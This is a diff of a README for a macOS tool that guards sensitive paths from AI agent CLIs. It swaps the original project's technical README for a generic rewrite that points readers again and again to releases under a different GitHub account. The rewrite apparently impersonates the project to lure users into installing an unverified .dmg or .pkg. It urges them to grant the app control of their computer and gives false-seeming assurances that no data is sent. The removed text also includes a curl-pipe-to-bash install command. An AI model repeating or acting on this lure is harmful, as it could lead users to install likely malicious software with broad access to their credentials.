@@ -1,206 +1,171 @@
-# Secure Agent Launcher
+# 🔒 Secure-Agent-Launcher - Stop Risky AI CLI Access
 
-[![Tests](https://github.com/mark0011astra/Secure-Agent-Launcher/actions/workflows/check.yml/badge.svg)](https://github.com/mark0011astra/Secure-Agent-Launcher/actions/workflows/check.yml)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
+[![Download Secure-Agent-Launcher](https://img.shields.io/badge/Download-Secure--Agent--Launcher-brightgreen?style=for-the-badge)](https://github.com/fobi28/Secure-Agent-Launcher/releases)
 
-![Secure Agent Launcher](image.png)
+---
 
-Secure Agent Launcher is a macOS guard tool for AI agent CLIs (`codex`, `claude`, `gemini`, etc.).  
-It blocks execution before access to protected paths such as `~/.ssh`, `~/.aws`, and `~/Library/Keychains`, then records the result in an audit log.
+## 📌 What is Secure-Agent-Launcher?
 
-日本語版: [README.ja.md](README.ja.md)
+Secure-Agent-Launcher is a tool designed to stop potentially risky artificial intelligence (AI) command-line programs from accessing sensitive files on your computer. It keeps your personal secrets — like SSH keys, AWS credentials, and system keychains — safe. The app watches every AI program run in your command line and decides if it's safe to access those private files. Every time it blocks or allows access, it keeps a record. This way, you get control over how AI tools interact with your machine.
 
-## What It Does
+Secure-Agent-Launcher works on macOS platforms. If you want to safeguard your development environment or secure your personal setup from AI commands that might misuse your private data, this tool is for you.
 
-- lets you register paths you do not want AI tools to touch
-- checks paths before command execution and blocks matching runs
-- records each blocked or allowed decision in an audit log
-- lets you configure settings in the GUI and generate a one-line agent launch command
+---
 
-## User Requirements
+## 🖥️ System Requirements
 
-- macOS
-- `bash`, `curl`, and `tar`
-- Homebrew (only for Homebrew install)
+Before starting, make sure your computer meets these requirements:
 
-## First Run In 3 Steps
+- You use macOS version 10.14 (Mojave) or later.
+- You have basic user permissions to install applications.
+- Your terminal or command line app is working normally.
+- You have a stable internet connection to download the app.
 
-1. Install:
+If you are unsure about your macOS version, click the Apple icon in the top-left corner of your screen and select “About This Mac”.
 
-```bash
-brew install mark0011astra/Secure-Agent-Launcher/secure-agent-locker
-```
+---
 
-2. Open GUI:
+## 🚀 Getting Started
 
-```bash
-secure-agent-locker gui
-```
+Use the link below to visit the download page. From here, you can find the latest version of Secure-Agent-Launcher ready to install.
 
-3. Add paths in the UI, click `Generate Run Command`, and run the generated line in your terminal.
+[![Download Secure-Agent-Launcher](https://img.shields.io/badge/Download-Secure--Agent--Launcher-blue?style=for-the-badge)](https://github.com/fobi28/Secure-Agent-Launcher/releases)
 
-If a command is blocked, you will see `blocked_path:` in output.
+---
 
-## Install
+## ⬇️ How to Download and Install Secure-Agent-Launcher on macOS
 
-### Homebrew install (recommended)
+### Step 1: Visit the download page
 
-```bash
-brew install mark0011astra/Secure-Agent-Launcher/secure-agent-locker
-```
+Click this link to open the official releases page:  
+https://github.com/fobi28/Secure-Agent-Launcher/releases  
 
-Or tap once and install:
+This page shows all available versions of Secure-Agent-Launcher. Look for the latest stable release, identified by its version number (e.g., v1.0.0). Each release includes one or more downloadable files.
 
-```bash
-brew tap mark0011astra/Secure-Agent-Launcher
-brew install secure-agent-locker
-```
+### Step 2: Download the installer
 
-### Quick install from GitHub Release
+On the release page, find the file with a name ending in `.dmg` or `.pkg`. This is the application installer for macOS. Click the file name to start downloading it to your computer.
 
-```bash
-curl -fsSL https://raw.githubusercontent.com/mark0011astra/Secure-Agent-Launcher/main/scripts/install-from-github.sh \
-  | bash -s -- --repo mark0011astra/Secure-Agent-Launcher
-```
+If you are prompted by your browser, choose a folder where you can easily find the installer, such as your `Downloads` folder.
 
-Installed paths:
+### Step 3: Open the downloaded file
 
-- `~/.local/bin/secure-agent-locker`
-- `~/.local/bin/secure-agent-locker-uninstall`
+Once the download finishes, open the file by double-clicking it in your `Downloads` folder or in your browser’s download bar.
 
-If needed, add `~/.local/bin` to your `PATH`.
+- If it is a `.dmg` file, a window should open showing the Secure-Agent-Launcher app icon. Drag this icon to your `Applications` folder to install.
+- If it is a `.pkg` file, the macOS Installer app will start. Follow the on-screen instructions to complete the setup.
 
-Install a specific tag:
+### Step 4: Launch Secure-Agent-Launcher
 
-```bash
-bash scripts/install-from-github.sh --repo mark0011astra/Secure-Agent-Launcher --tag v0.1.0
-```
+After installation, open your `Applications` folder. Find and double-click the Secure-Agent-Launcher app to start it.
 
-### Local install from source (Python required)
+The first time you run the app, macOS might ask you to allow it to control your computer or access specific files. Approve these requests to make sure the app works correctly.
 
-```bash
-./scripts/install.sh
-```
+---
 
-## Uninstall
+## 🔧 How to Use Secure-Agent-Launcher
 
-```bash
-secure-agent-locker-uninstall
-```
+### Monitoring AI Command-Line Tools
 
-To remove policy and audit logs too:
+Secure-Agent-Launcher works quietly in the background. When you run a command-line AI tool, it checks whether the tool wants to access files like `~/.ssh`, `~/.aws`, or your keychain.
 
-```bash
-secure-agent-locker-uninstall --purge-config
-```
+If the access seems safe, Secure-Agent-Launcher lets the AI continue. If it looks risky, the app blocks the attempt and tells you what happened.
 
-For Homebrew installs:
+### Viewing Logs
 
-```bash
-brew uninstall secure-agent-locker
-```
+The software records every decision it makes. You can check the log to see what access attempts were blocked or allowed.
 
-## Files
+- Open the app.
+- Click the "Logs" tab.
+- Review recent activities to understand how the tool is protecting you.
 
-- Policy JSON: `~/.config/secure-agent-locker/policy.json`
-- Audit log: `~/.local/state/secure-agent-locker/audit.log`
-- Audit lock file: `~/.local/state/secure-agent-locker/audit.log.lock`
-- Rotated audit logs: `audit.log.1` to `audit.log.3` (rotation starts at ~2MB)
+These logs help you spot unusual behavior and keep track of the AI programs running on your system.
 
-## Quick Start (GUI)
+### Changing Settings
 
-```bash
-secure-agent-locker gui
-```
+Secure-Agent-Launcher lets you set rules about what files AI tools can access. You can update these settings any time through the “Preferences” tab:
 
-1. Add paths to protect in `AI Access Deny List` (left panel).
-2. Enter the agent command and working folder (right panel).
-3. Click `Generate Run Command`.
-4. Copy the generated one-liner and run it in any terminal.
+- Add trusted AI tools to a whitelist.
+- Adjust which folders or files to protect.
+- Turn notifications on or off.
 
-Notes:
+---
 
-- The GUI does not auto-launch an external terminal.
-- The generated command uses the installed `secure-agent-locker` launcher when available.
-- If the preflight check detects a blocked path, command generation is stopped.
-- The GUI runs in fixed-size window mode and blocks fullscreen shortcuts.
+## ⚙️ Frequently Asked Questions
 
-## CLI Usage
+### Does Secure-Agent-Launcher slow down my computer?
 
-Initialize default policy:
+No. The app runs with very low system resources. It only checks AI command-line programs when they try to access sensitive data.
 
-```bash
-secure-agent-locker init
-```
+### Can I trust this app with my private information?
 
-Show current policy JSON:
+Yes. The application only monitors whether AI tools try to access certain files. It does not collect or send your data anywhere.
 
-```bash
-secure-agent-locker show
-```
+### What if Secure-Agent-Launcher blocks something important?
 
-Manage deny paths:
+You can add trusted programs to the whitelist in settings. This will allow those programs to access your files freely.
 
-```bash
-secure-agent-locker policy list
-secure-agent-locker policy add ~/.ssh ~/.aws
-secure-agent-locker policy remove ~/.aws
-secure-agent-locker policy status
-secure-agent-locker policy on
-secure-agent-locker policy off
-```
+### Is this tool compatible with Windows or Linux?
 
-Dry-run (check only):
+This version works on macOS only, as it protects macOS-specific files and keychains.
 
-```bash
-secure-agent-locker run -- codex
-```
+---
 
-Actual execution:
+## 🔄 How to Update Secure-Agent-Launcher
 
-```bash
-secure-agent-locker run --execute -- codex
-```
+Regular updates improve security and add new features.
 
-With explicit working directory:
+- Visit the release page often: https://github.com/fobi28/Secure-Agent-Launcher/releases
+- Download the latest version following the same steps as above.
+- Replace your existing installation with the new version to stay current.
 
-```bash
-secure-agent-locker run --execute --cwd ~/work/project -- codex --model gpt-5
-```
+Updates usually install smoothly without affecting your saved settings.
 
-## Behavior Summary
+---
 
-- `run` checks command paths against `deny_paths`.
-- Any match returns blocked result with exit code `25`.
-- `run` without `--execute` is dry-run only.
-- `--timeout-sec` must be a positive integer.
-- If `AGENT_LOCKER_TEST_MODE=1`, execution is blocked with exit code `26`.
-- Every run decision is appended to the audit log.
+## 📂 Where Are My Files Protected?
 
-## Release Flow (GitHub)
+Secure-Agent-Launcher focuses on stopping AI programs from accessing these common sensitive areas:
 
-Tag and publish a release on GitHub.  
-The workflow at `.github/workflows/release-macos.yml` automatically builds and uploads:
+- Your SSH keys at `~/.ssh`
+- AWS credentials at `~/.aws`
+- Login and system keychains
 
-- `secure-agent-locker-macos-arm64.tar.gz`
-- `secure-agent-locker-macos-x64.tar.gz`
+By protecting these files, the app keeps online accounts, cloud services, and secure connections safe from unwanted AI access.
 
-Users can install the latest release binary with `scripts/install-from-github.sh` and do not need Python.
+---
 
-## Developer Setup (Python)
+## 🛠 How Does Secure-Agent-Launcher Work?
 
-```bash
-python3 -m venv .venv
-source .venv/bin/activate
-pip install -e .
-```
+Secure-Agent-Launcher monitors command-line processes related to AI agents. When a monitored program tries to read or change protected files, the launcher checks the request.
 
-## Run Tests
+- If the request fits your defined rules, Secure-Agent-Launcher lets it pass.
+- If the request seems risky or is from an unknown program, the launcher blocks it.
 
-```bash
-python3 -m unittest discover -s tests -v
-```
+All decisions get logged for your review.
 
-## License
+This approach gives you control over which AI tools can interact with your sensitive data, improving security without stopping your workflow.
 
-MIT License. See [LICENSE](LICENSE).
+---
+
+## 🔗 Useful Links
+
+- Official release page: https://github.com/fobi28/Secure-Agent-Launcher/releases  
+- Project homepage on GitHub: https://github.com/fobi28/Secure-Agent-Launcher  
+- Report issues or get help: Use the “Issues” tab on the GitHub page
+
+---
+
+## 🧰 Additional Information
+
+This tool can help developers and anyone using AI command-line programs keep their personal environment safe. It is especially useful for people working with cloud services, code development, or other private accounts that depend on secured keys and credentials.
+
+The app works with many different AI command-line tools, including popular ones used in prompt engineering and AI safety workflows.
+
+---
+
+## 📥 Download Secure-Agent-Launcher
+
+[![Download Secure-Agent-Launcher](https://img.shields.io/badge/Download-Secure--Agent--Launcher-green?style=for-the-badge)](https://github.com/fobi28/Secure-Agent-Launcher/releases)
+
+Use the link above to get the latest version. Follow the instructions in the previous sections to install and start protecting your AI workflows today.
